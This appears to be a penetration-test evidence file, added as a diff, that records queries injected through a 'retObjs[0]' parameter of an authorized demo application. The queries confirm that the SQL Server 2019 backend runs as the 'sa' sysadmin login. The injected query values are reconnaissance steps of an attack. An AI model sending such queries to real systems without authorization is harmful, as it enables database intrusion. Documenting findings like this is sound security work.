@@ -1,0 +1,21 @@
+e2 · database identity (authorized demo deployment, host redacted)
+====================================================================
+
+Request: retObjs[0] = SELECT @@VERSION
+
+HTTP 200
+{"status":"success","data":"{\"A\":[{\"Column1\":{\"String\":\"Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+ Sep 24 2019 13:48:23
+ Copyright (C) 2019 Microsoft Corporation
+ Developer Edition (64-bit) on Windows Server 2019 Datacenter 10.0 <X64> (Build 17763: ) (Hypervisor)\"}}]}"}
+
+Request: retObjs[0] = SELECT SYSTEM_USER
+
+HTTP 200 → "sa"
+
+Request: retObjs[0] = SELECT IS_SRVROLEMEMBER('sysadmin')
+
+→ 1
+
+Interpretation: the application's database connection runs as the SQL Server
+sysadmin principal "sa".
